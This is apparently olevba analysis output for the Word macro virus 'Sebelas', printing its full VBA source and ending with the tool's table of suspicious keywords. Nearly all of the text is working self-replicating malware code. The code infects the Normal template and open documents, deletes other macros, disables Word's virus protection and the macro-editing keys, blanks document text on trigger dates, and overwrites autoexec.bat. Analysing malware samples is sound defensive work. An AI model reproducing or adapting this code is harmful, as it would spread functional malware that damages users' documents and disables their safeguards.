olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Sebelas
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Sebelas - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO xSebelas.bas 
in file: Virus.MSWord.Sebelas - OLE stream: 'Macros/VBA/xSebelas'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Public DokAktif As Object, xSTujuan As Variant
Public xSAda As Boolean, xSmusnahkan As Boolean, ReSet As Boolean, xSAExec As Boolean, _
DocCount As Boolean, CekFAutoBat As Boolean, CekFxBat As Boolean
Function xSebelasInit()
Dim nMakro(1) As String
Dim TempNormal As Object
Dim xSSumber$
On Error Resume Next
Kill Options.DefaultFilePath(8) & "\SNrml.src"
Kill Options.DefaultFilePath(8) & "\SNrml.dot"
Kill Options.DefaultFilePath(8) & "\win32s16.dll"
Kill Options.DefaultFilePath(8) & "\win32s16.dot"
On Error GoTo selesai
nMakro(0) = "xSebelas"
nMakro(1) = "xPose"
xSSumber = MacroContainer
Set TempNormal = NormalTemplate
If Not DocCount Then
Set DokAktif = ActiveDocument
ElseIf xSSumber <> "winsspi.dot" Then
xSSumber = TempNormal
End If
If xSSumber = TempNormal Then
xSSumber = TempNormal.FullName: Set xSTujuan = DokAktif
ElseIf xSSumber = DokAktif Then
xSSumber = DokAktif.FullName: Set xSTujuan = TempNormal
ElseIf xSSumber = "winsspi.dot" Then
Set xSTujuan = TempNormal
xSSumber = Options.DefaultFilePath(8) & "\bios.vxd"
End If
AntiMakro xSTujuan
With xSTujuan.VBProject
If Not (Not xSmusnahkan And .Description = "xSebelas" And .VBComponents.Count > 2) Then
    Mcopy xSSumber, xSTujuan, nMakro
    xSmusnahkan = False
    .Description = "xSebelas"
    If xSTujuan = TempNormal Then
        Options.SaveInterval = 1
        CustomizationContext = TempNormal
        CommandBars("Tools").ReSet
        FindKey(BuildKeyCode(wdKeyF11, wdKeyAlt)).Disable
        FindKey(BuildKeyCode(wdKeyF8, wdKeyAlt)).Disable
        On Error GoTo 0
        xSTujuan.Save
    End If
Else
GoTo Aksi
End If
End With
If xSAda = True Then Exit Function
ReFresh
On Error Resume Next
Aksi:
If xSAExec = True Then Exit Function
Exit Function
selesai:
End Function
Sub AntiMakro(fSumber)
Dim nMakro As Object
For Each nMakro In fSumber.VBProject.VBComponents
    If nMakro.Name <> "ThisDocument" And nMakro.Name <> "NewMacros" _
    And nMakro.Name <> "xSebelas" And nMakro.Name <> "xPose" Then
        xSmusnahkan = True
        If ReSet Then
        Application.OrganizerDelete fSumber.FullName, nMakro.Name, 3
        Else
        nMakro.CodeModule.DeleteLines 1, nMakro.CodeModule.CountOfLines
        End If
    End If
Next nMakro
End Sub
Sub Coba()
MsgBox Options.DefaultFilePath(4)
End Sub
Sub Mcopy(fSumber, Dfile, nMakro)
Dim xSNmakro
For Each xSNmakro In nMakro
Application.OrganizerCopy fSumber, Dfile.FullName, xSNmakro, 3
Next
End Sub
Sub Iklan()
xPose.Show
Application.OnTime When:=Now + TimeValue("00:30:00"), Name:="xSebelas.Iklan"
End Sub
Sub FileOpen()
WordBasic.DisableAutoMacros True
If Dialogs(80).Show <> 0 Then
WordBasic.DisableAutoMacros False
AutoOpen
Else
WordBasic.DisableAutoMacros False
End If
End Sub
Sub AutoOpen()
On Error Resume Next
If Now > DateSerial(1999, 4, 11) And Day(Now) = 11 Then GoTo Putihkan
If Month(Now) = 11 Then GoTo CekTanggal1
If Month(Now) = 10 Then GoTo CekTanggal2
If Month(Now) = 2 Then GoTo CekTanggal3
GoTo EndCekTanggal
Putihkan:
Selection.WholeStory
    Selection.Font.ColorIndex = wdWhite
    Selection.MoveLeft Unit:=wdCharacter, Count:=1
    Selection.Font.ColorIndex = wdBlack
    Selection.TypeText Text:="Viva eX-SeBeLaS !"
GoTo EndCekTanggal
CekTanggal1:
If Day(Now) = 1 Then MsgBox "'Met ulang tahun Erry Delphiero !", vbInformation, "eX-Sebelas release 3.9"
GoTo EndCekTanggal
CekTanggal2:
If Day(Now) = 7 Then MsgBox "'Met ulang tahun DaNnY DeSPiRo !", vbInformation, "eX-Sebelas release 3.9"
GoTo EndCekTanggal
CekTanggal3:
If Day(Now) = 4 Then MsgBox "'Met ulang tahun Natalie Imbruglia !", vbInformation, "eX-Sebelas release 3.9"
EndCekTanggal:
Application.EnableCancelKey = wdCancelDisabled
xSebelasInit
If Documents.Count > 1 Then
    For i = 1 To Documents.Count
    If Documents(i).Name <> ActiveDocument.Name Then
    Set DokAktif = Documents(i)
    DocCount = True
    xSmusnahkan = False
    xSebelasInit
    End If
    Next
End If
If Now > DateSerial(1999, 4, 11) Then Application.OnTime When:=Now + TimeValue("00:30:00"), Name:="xSebelas.Iklan"
End
End Sub
Sub ViewVBCode()
End Sub
Sub AutoExec()
On Error Resume Next
If MacroContainer <> NormalTemplate Then
xSAExec = True
xSebelasInit
WordBasic.DisableAutoMacros True
AddIns.Unload False
WordBasic.DisableAutoMacros False
End If
Application.EnableCancelKey = wdCancelDisabled
End Sub
Sub AutoExit()
Dim xSAddin As Object
If Now > DateSerial(1999, 4, 11) Then
CekFAutoBat = False
CekFxBat = False
Set FAutoBat = Application.FileSearch
With FAutoBat
    .LookIn = "c:\"
    .FileName = "autoexec.bat"
    If .Execute > 0 Then CekFAutoBat = True
End With
Set FxBat = Application.FileSearch
With FxBat
    .LookIn = "c:\"
    .FileName = "xSebelas.bat"
    If .Execute > 0 Then CekFxBat = True
End With
If CekFAutoBat = False And CekFxBat = False Then GoTo GenAuto
If CekFAutoBat = True And CekFxBat = True Then GoTo EndBatcher
If CekFAutoBat = False And CekFxBat = True Then Kill "c:\xSebelas.bat"
If CekFAutoBat = True And CekFxBat = False Then GoTo GenBatch
GenAuto:
        Open "c:\autoexec.bat" For Output As #1
        Write #1, "::" + Chr(13) + Chr(10) + "@Echo off" _
        + Chr(13) + Chr(10) + "Cls" + Chr(13) + Chr(10) + "::"
        Close #1
GenBatch:
        Name "c:\autoexec.bat" As "c:\xSebelas.bat"
        Open "c:\autoexec.bat" For Output As #2
        Write #2, "::" + Chr(13) + Chr(10) + "@Echo off" + Chr(13) + Chr(10) + "Cls" _
        + Chr(13) + Chr(10) + "If Exist c:\xSebelas.bat Call c:\xSebelas.bat" _
        + Chr(13) + Chr(10) + "Echo." + Chr(13) + Chr(10) + "Echo." + Chr(13) + Chr(10) + _
"Echo      ÉÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ»" + Chr(13) + Chr(10) + _
"Echo      º                       eX-SeBeLaS release 3.9                       º" + Chr(13) + Chr(10) + _
"Echo      º          [ special dedicated to Natalie 'Jane' Imbruglia ]         º" + Chr(13) + Chr(10) + _
"Echo      ÇÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ" + Chr(182) + Chr(13) + Chr(10) + _
"Echo      º DaNnY DeSPiRo :                                                    º" + Chr(13) + Chr(10) + _
"Echo      º Salam saya buat anak-anak SMAN 11 Bandung, Analisis Kimia - UNPAD, º" + Chr(13) + Chr(10) + _
"Echo      º Delapan Makhluk Cute (DMC), QLas (KIR SMUN 11 Bandung), 'truz buat º" + Chr(13) + Chr(10) + _
"Echo      º Jihan Fahira (kapan kamu mampir ke rumah lagi ? e-mail saya dong), º" + Chr(13) + Chr(10) + _
"Echo      º teman-teman saya di alam fana ini dan spesial buat cewek lucu yang º" + Chr(13) + Chr(10) + _
"Echo      º mirip Natalie Imbruglia ...                  [despiro@hotmail.com] º" + Chr(13) + Chr(10) + _
"Echo      ÇÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ" + Chr(182) + Chr(13) + Chr(10) + _
"Echo      º ErRy DeLPhIeRo :                                                   º" + Chr(13) + Chr(10) + _
"Echo      º BuAT aNAk-AnAk AMIK-SuKapURa TSM, AMIK-BaNDuNg, DJEPROETH '95, 'en º" + Chr(13) + Chr(10) + _
"Echo      º BaRuDaK TeAtEr NuAnSa, BuAt GadSam '95 : DoNt FoRgEt Me ... E-MaiL º" + Chr(13) + Chr(10) + _
"Echo      º GuE YaCh ... Buat ANaK-aNAk 'ACC', Buat GaDiS-GaDIs  YaNG CaRe 'en º" + Chr(13) + Chr(10) + _
"Echo      º MaU KeNAlaN AMa ErRy di TuNGgU LHo e-maiLnyA, 'en SpECiaL SmILe To º" + Chr(13) + Chr(10) + _
"Echo      º LuTju GiRl NaTaLiE ImBrUgLiA !             [delphiero@hotmail.com] º" + Chr(13) + Chr(10) + _
"Echo      ÇÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ" + Chr(182) + Chr(13) + Chr(10) + _
"Echo      º ... sorry for sending you a virus (maybe more than one), we just - º" + Chr(13) + Chr(10) + _
"Echo      º want to prove to ourselves that  virus programming is very fun ... º" + Chr(13) + Chr(10) + _
"Echo      ÈÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ¼" + Chr(13) + Chr(10) + _
"Echo." + Chr(13) + Chr(10) + "::"
        Close #2
EndBatcher:
End If
On Error GoTo EndAutoExit
WordBasic.DisableAutoMacros True
If Documents.Count <> 0 Then Documents.Close
Options.DefaultFilePath(2) = Options.DefaultFilePath(6)
xSAda = True
For Each xSAddin In AddIns
    If xSAddin.Name = "winsspi.dot" Then xSAda = False
Next xSAddin
If xSAda = True Then
Application.Visible = False
Documents.Add
xSebelasInit
    With ActiveDocument
        .SaveAs FileName:=Options.DefaultFilePath(8) & "\bios.vxd", FileFormat:=wdFormatDocument, AddToRecentFiles:=False
        .SaveAs FileName:=Options.DefaultFilePath(8) & "\winsspi.dot", FileFormat:=wdFormatTemplate, AddToRecentFiles:=False
    End With
End If
Application.Quit
EndAutoExit:
WordBasic.DisableAutoMacros False
End Sub
Sub ToolsMacro()
On Error Resume Next
CommandBars("Tools").Controls("Macro").Delete
CustomizationContext = NormalTemplate
WordBasic.DisableAutoMacros False
AntiMakro ActiveDocument
End Sub
Sub FileTemplates()
WordBasic.DisableAutoMacros False
If Not ReSet Then Dialogs(87).Display
End Sub
Sub FormatStyle()
WordBasic.DisableAutoMacros False
Dialogs(180).Show
End Sub
Function ReFresh()
ReSet = True
FileTemplates
AntiMakro xSTujuan
End Function
Sub AutoClose()
Application.DisplayAlerts = -1
With Options
.SaveNormalPrompt = False
.SaveInterval = 10
.VirusProtection = False
End With
If InStr(1, ActiveDocument.Name, "Docume", 1) = 0 And ActiveDocument.Name <> "winsspi.dot" Then
   xSebelasInit
   ActiveDocument.SaveAs FileName:=ActiveDocument.Name, FileFormat:=wdFormatDocument
End If
End Sub
Sub FileExit()
AutoExit
End Sub
Sub ToolsOptions()
Options.DefaultFilePath(wdUserTemplatesPath) = "C:\Program Files\Microsoft Office\Templates"
Dialogs(wdDialogToolsOptions).Show
Options.DefaultFilePath(wdUserTemplatesPath) = Application.Path
End Sub
Sub HelpAbout()
xPose.Show
End Sub
-------------------------------------------------------------------------------
VBA MACRO xPose.frm 
in file: Virus.MSWord.Sebelas - OLE stream: 'Macros/VBA/xPose'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 






































Private Sub UserForm_Click()

End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoExec            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoExit            |Runs when the Word document is closed        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|AutoExec  |UserForm_Click      |Runs when the file is opened and ActiveX     |
|          |                    |objects trigger events                       |
|Suspicious|Open                |May open a file                              |
|Suspicious|Write               |May write to a file (if combined with Open)  |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Application.Visible |May hide the application                     |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |win32s16.dll        |Executable file name                         |
|IOC       |autoexec.bat        |Executable file name                         |
|IOC       |xSebelas.bat        |Executable file name                         |
+----------+--------------------+---------------------------------------------+

